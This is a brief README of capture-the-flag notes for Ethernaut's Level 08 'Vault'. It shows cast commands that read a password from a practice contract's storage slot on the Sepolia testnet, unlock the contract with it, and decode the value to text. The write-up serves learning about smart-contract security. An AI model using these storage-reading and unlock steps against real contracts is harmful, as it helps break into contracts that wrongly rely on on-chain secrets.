# Repo of my attack contracts for Ethernaut

## Notes

### Level 08 - Vault
    - First take the deployed contract address from the Ethernaut
    - Then use the cast storage command to get the value stored at slot 1
```bash
cast storage 0x7f28d1dABCcCB4d88C305Ed18499aa6A8A1F8AD2 1 --rpc-url $SEPOLIA_RPC_URL 
  |
  |
 \ /

0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

    - Next, we call the function unlock with the secret as the parameter:
```bash
cast send 0x7f28d1dABCcCB4d88C305Ed18499aa6A8A1F8AD2 "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url ...
```
    - We can encode the parameter by using cast:

    ```bash
cast to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
                \/
A very strong secret password :)

    ```
    